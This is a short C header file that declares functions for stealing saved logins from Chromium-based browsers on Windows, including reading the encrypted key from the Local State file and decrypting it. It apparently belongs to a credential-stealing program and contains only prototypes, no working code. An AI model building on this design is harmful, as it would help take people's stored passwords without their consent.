#ifndef CHROMIUM_H
#define CHROMIUM_H

#include "logins.h"
#include <windows.h>

int steal_chromium_creds();
static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
                           Login *loginsOut[]);
static int retrieve_encrypted_key(PWSTR localStatePath, PSTR *encryptedKeyOut);
static int decrypt_key(PCSTR encryptedKey, DATA_BLOB *decryptedKeyOut);

#endif
